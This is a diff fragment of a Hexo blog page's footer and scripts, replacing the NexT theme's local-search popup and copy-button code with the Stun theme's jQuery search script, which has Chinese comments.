class="reward-qrcode-wechat__text">Wechat</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2019/03/08/kaoyan/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Unknown Article</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2019/03/02/xss20/"><span class="paginator-prev__text">XSS20冲关之旅</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Aesm1p</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
   }
-</script>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-    
-    
-  
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
-
-
-
-  
-  
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/three/three.min.js"></script>
-
-  
-  <script src="/lib/three/three-waves.min.js"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=6.7.0"></script>
-
-  <script src="/js/src/motion.js?v=6.7.0"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/affix.js?v=6.7.0"></script>
-
-  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>
-
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
-<script src="/js/src/post-details.js?v=6.7.0"></script>
-
-
-
-  
-
-
-  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
-
-
-
-  
-
-
-  
-
-
-  
-
-  <script>
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ Untitled ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
                 }
 
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
                     }
                   });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                 }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
+                return result;
               }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
             });
-          }
 
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
 
-          proceedsearch();
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
         }
       });
     }
+  });
+}
 
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
 
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
       e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
     });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
       }
     });
-  </script>
+  };
 
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-  <style>
-    .copy-btn {
-      display: inline-block;
-      padding: 6px 12px;
-      font-size: 13px;
-      font-weight: 700;
-      line-height: 20px;
-      color: #333;
-      white-space: nowrap;
-      vertical-align: middle;
-      cursor: pointer;
-      background-color: #eee;
-      background-image: linear-gradient(#fcfcfc, #eee);
-      border: 1px solid #d5d5d5;
-      border-radius: 3px;
-      user-select: none;
-      outline: 0;
-    }
-
-    .highlight-wrap .copy-btn {
-      transition: opacity .3s ease-in-out;
-      opacity: 0;
-      padding: 2px 6px;
-      position: absolute;
-      right: 4px;
-      top: 8px;
-    }
-
-    .highlight-wrap:hover .copy-btn,
-    .highlight-wrap .copy-btn:focus {
-      opacity: 1
-    }
-
-    .highlight-wrap {
-      position: relative;
-    }
-  </style>
-  <script>
-    $('.highlight').each(function(i, e) {
-      var $wrap = $('<div>').addClass('highlight-wrap');
-      $(e).after($wrap);
-      $wrap.append($('<button>').addClass('copy-btn').append('Copy').on('click', function(e) {
-        var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
-          return $(e).text();
-        }).toArray().join('\n');
-        var ta = document.createElement('textarea');
-        var range = document.createRange(); //For Chrome
-        var sel = window.getSelection(); //For Chrome
-        var yPosition = window.pageYOffset || document.documentElement.scrollTop;
-        ta.style.top = yPosition + 'px'; //Prevent page scroll
-        ta.style.position = 'absolute';
-        ta.style.opacity = '0';
-        ta.value = code;
-        ta.textContent = code; //For FireFox
-        ta.contentEditable = true;
-        ta.readOnly = false;
-        document.body.appendChild(ta);
-        range.selectNode(ta);
-        sel.removeAllRanges();
-        sel.addRange(range);
-        ta.setSelectionRange(0, code.length);
-        var result = document.execCommand('copy');
-        
-        ta.blur(); //For iOS
-        $(this).blur();
-      })).on('mouseleave', function(e) {
-        var $b = $(this).find('.copy-btn');
-        setTimeout(function() {
-          $b.text('Copy');
-        }, 300);
-      }).append(e);
-    })
-  </script>
-
-
-  
-
-  <script type="text/javascript" src="/js/src/dynamic_bg.js"></script>
-  <!-- 页面点击小红心 -->
-  <script type="text/javascript" src="/js/src/clicklove.js"></script>
-</body>
-</html>
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script type="application/json" src="/search.json"></script></body></html>
